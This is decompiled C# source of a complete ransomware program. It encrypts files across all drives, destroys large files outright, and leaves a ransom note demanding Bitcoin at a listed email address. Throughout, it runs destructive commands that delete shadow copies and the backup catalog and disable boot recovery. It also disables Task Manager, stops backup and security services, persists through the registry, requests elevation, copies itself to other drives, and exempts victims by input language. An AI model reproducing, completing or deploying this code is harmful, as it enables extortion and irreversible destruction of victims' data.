	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail :DarkxAnon7@gmail.com ( In case of no answer in 24 hours check your spam folder",
		"or write us to this e-mail: DarkxAnon7@gmail.com)", "", "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ", "After payment we will send you the tool that will decrypt all your files.)"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>4VTRYGVyEUN0UXUt/Wb98VZuBynfit/ZjTKpgY9xrK2q9IkesU6Ur5yqmQMffnjpdWTDC2RpkHJU+mo0gjDOsnJDUsBlDBFOUka26L3WSCWVEVvdMlXO4jxsJvpbsZhD0Mvq8ieoZNyzyzT8VdrngfJooWdHHAe2KTtECAjg1b5fK/XEtJgNRBPcjY/x0D63WJbNNc9HBLNf7pTYjXpMcRqyZBfPtcGHOuNqwiegpc/dh/Yw6if89kNKpG/E8PmJ2vGJsKcrTZsVkZF7gpLYLR+pQAUB5Tqbu4333OseL9pOOtzFxF9LnTE8QIVLriItL9EyyWcIwhFFjnzX8q5z3Q==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
